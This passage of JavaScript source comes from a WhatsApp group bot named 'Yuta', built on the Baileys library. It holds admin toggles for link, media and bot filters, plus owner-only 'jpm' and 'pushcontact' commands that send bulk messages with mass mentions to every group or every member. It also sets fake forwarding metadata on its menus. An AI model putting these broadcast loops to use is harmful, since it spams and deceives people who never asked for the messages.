               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antimedia = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antidocument = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antidocument = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
         
               if (args[0] === 'on') {
                  db.data.groups[m.chat].anticontact = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].anticontact = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antilocation = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antilocation = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antilink = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antilink = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'simih':{
if (!YutaTheCreator) return m.reply('nah nah ngapain')
if (!q) return m.reply(`Pilih on atau off`)//wm senn
if (args[0] === "on") {
if (SimiActive) return m.reply('Already activated')
simion.push(from)
fs.writeFileSync('./database/simion.json', JSON.stringify(simion))//wm senn
m.reply('Success in turning on Simi in this group')
var groupe = await Yuta.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})//wm senn
Yuta.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nSimi Online!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!SimiActive) return m.reply('Already deactivated')
let off = simion.indexOf(from)//wm senn
simion.splice(off, 1)
fs.writeFileSync('./database/simion.json', JSON.stringify(simion))//wm senn
m.reply('Success in turning off Simi in this group')
} else {
 await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }//wm senn
 break
            case 'antilinkgc': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antilinkgc = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antilinkgc = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antilinkch': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antilinkch = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antilinkch = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antilinknumber': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antilinknumber = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antilinknumber = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'antibot':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antibot = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antibot = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
case 'mute':{
if (!m.isGroup) return replygcyuta('Fitur Khusus Group!')
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (args[0] === "on") {
addCountCmd('#mute', m.sender, cmdha)
if (isMute) return replygcyuta(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
replygcyuta('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, cmdha)
if (!isMute) return replygcyuta(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
replygcyuta('Successfully Unmute In This Group')
}else {
replygcyuta(`${xprefix+command} on -- _mengaktifkan_\n${xprefix+command} off -- _Menonaktifkan_`)
}}
break
			case 'pinchat': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (m.isGroup) return XeonStickPrivate()
Yuta.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (m.isGroup) return XeonStickPrivate()
Yuta.chatModify({ pin: false }, m.chat)
}
break
			case 'clearchat': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
Yuta.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
			case 'checkmember': case 'cekmember':{
                                if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
replygcyuta(`Group: *${groupMetadata.subject}*\nTotal participants: *${participants.length}*`)
                                }
                                break
			case 'jpm': case 'post': case 'pushcontactgc': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!text) return replygcyuta(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcyuta(`In progress...`)
let getGroups = await Yuta.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Yuta.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Yuta.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Yuta.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Yuta.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcyuta(`Success`)
}
break
			case 'pushcontact': {
    if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
    if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
    if (!text) return replygcyuta(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcyuta(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Yuta.sendMessage(pler, { text: q})
     }  
     replygcyuta(`Done`)
      }
      break
case 'pushcontactv2':{
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!q) return replygcyuta(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
try {
const metadata2 = await Yuta.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
Yuta.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcyuta(`Success`)
} catch {
	replygcyuta(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
	}
}
break
case 'pushcontactv3': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!text) return replygcyuta(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
try {
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Yuta.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Yuta.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(jedany)
} else {
await Yuta.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcyuta(`Success`)
} catch {
	replygcyuta(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
}
}
break
			case 'autosticker': case 'autostickergc':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")        
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    replygcyuta(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcyuta(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
